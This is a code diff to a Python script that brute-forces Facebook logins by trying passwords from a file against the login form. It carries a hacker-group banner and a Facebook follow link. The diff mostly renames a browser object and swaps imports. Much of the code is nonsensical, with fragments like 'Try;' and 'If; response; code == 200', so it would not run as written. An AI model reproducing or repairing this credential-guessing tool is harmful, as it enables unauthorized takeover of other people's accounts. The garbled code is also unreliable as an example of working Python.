@@ -1,17 +1,16 @@
 import code
 import fileinput
-import importlib
-from itertools import count
+from socket import timeout
 import sys
 from argparse import FileType
 from ast import Break, Continue, If, Try
 from math import pi
-import BROWSE
 from tokenize import String
 import urllib
 from nturl2path import url2pathname
 import time
 from urllib.request import urlopen 
+import urllib
 
 3<4
 G=444333
@@ -25,8 +24,7 @@ print('| _|  | _ \   | _ \ |   / | |_| |   | |   | _|     \ V /  | _|  |   /    
 print('|_|   |___/   |___/ |_|_\  \___/    |_|   |___|     \_/   |___| |_|_\   /___| (_)  /_/')
 print('FOLLOW US ON FB:www.facebook.com/cyberhacks6')
 print('GOD BLESS NIGERIA')
-                                                                                         
-file=open('password.txt','r')
+sfile=open('password.txt','r')
 
 def login( email, password):
     urlopen = 'https://www.facebook.com/login.php'
@@ -40,14 +38,14 @@ while FileType :
 if len(password) < 10:
    Continue
    print=str(i) +" : ",password
-response = BROWSE.open(urlopen);
+response = browser.open(urlopen);
 
 Try;
 If; response; code == 200
-BROWSE.select_form(nr=o)
-BROWSE.form['email']=email
-BROWSE.form['pass']=password
-response = BROWSE.submit()
+browser.select_form(nr=o)
+browser.form['email']=email
+browser.form['pass']=password
+response = browser.submit()
 response_data = response.read()
 'find friends' in response_data or 'two-factor authentication' in response_data or 'security code' in response_data;
 print('your password is : ',password)
@@ -57,7 +55,7 @@ n=1
 n<6
 n=1,2,3,4,5,6
 print('n/1,2,3,4,5 system cooldown n/')
-count(5)
+timeout(5)
 sys.exit
 
 
